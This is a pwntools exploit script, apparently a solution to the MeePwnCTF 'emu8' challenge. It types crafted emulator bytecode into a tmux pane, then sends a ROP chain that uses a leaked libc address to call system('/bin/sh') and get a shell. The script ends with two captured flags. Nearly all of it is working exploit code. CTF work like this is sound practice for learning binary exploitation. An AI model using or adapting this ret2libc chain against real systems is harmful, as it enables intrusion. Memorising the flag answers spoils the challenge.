from pwn import *
import time
import libtmux

__author__ = 'b1gtang'

timeout = 0.3

# 1 if a >= 0x3d8: a -= 1
# 2 a += 1
# 3 [a] += 1
# 4 [a] -= 1
# 5 print [a]
# 6 write [a]
# 7 if [a] == 0: skip until 0x8
# 8 if [a] != 0: skip until 0x7
# 0 exit

p  = ''
p += '1'  # i = 0x3b7
p += '6'  # i = 0x3b2
p += '6'  # 13
p += '26' # b8
p += '2'  # i = 0x3b
p += '2'  # i = 0x3b
p += '2626'*24
p += '0e'
print p

q  = ''
q += 'b4'
q += '13b8'
q += '6500' # ld v5, 0               	b8
q += '6401' # ld v4, 1
q += '6300' # ld v3, 0			bc
q += '60ff' # ld v0, 0xff # label3
q += '617e' # ld v1, 0x7e		c0
q += '6200' # ld v2, 0x0 # i
q += '8543' # xor v5, v4 		c4
q += 'a000' # ld i, 0
q += 'f31e' # ad i, v3			c8
q += '4218' # sne v2, 0x18 # label 2
q += '13d4' # jp label1 		cc
q += 'f01e' # add i, v0
q += '7201' # add v2, 1			d0
q += '13ca' # jp label 2
q += 'f11e' # add i, v1 # label 1	d4
q += '4500' # sne v5, 0
q += '13de' # jmp label4		d8
q += '231c' # call w
q += '13be' # jmp label3		dc
q += '235a' # call r # label 4
q += '7301' # add v3, 1		        e0
q += '3318' # se v3, 0x18
q += '13be' # jmp label 3		e4
q += '00fd' # exit
print q

import libtmux
# tmux new-session -s foo -n bar
server = libtmux.Server()
session = server.find_where({ "session_name": "foo" })
window = session.attached_window
pane = window.attached_pane
#pane.send_keys('./emu8')

for i in p:
    log.info(i)
    time.sleep(timeout)
    pane.send_keys(i)

for i in q:
    log.info(i)
    time.sleep(timeout)
    pane.send_keys(i)

payload  = p64(0x402803) # pop rdi; ret
for i in payload.encode('hex'):
    log.info(i)
    time.sleep(timeout)
    pane.send_keys(i)

leak = int(raw_input('input leak: ').strip(), 16)

libc = ELF('./libc.so.6')
libc.address =  leak-0x20830
payload  = ''
payload += p64(libc.search('/bin/sh\x00').next())
payload += p64(libc.sym['system'])

for i in payload.encode('hex'):
    log.info(i)
    time.sleep(timeout)
    pane.send_keys(i)

# MeePwnCTF{t3di0us_ch4ll3nge}
# MeePwnCTF{emu_in_emu}
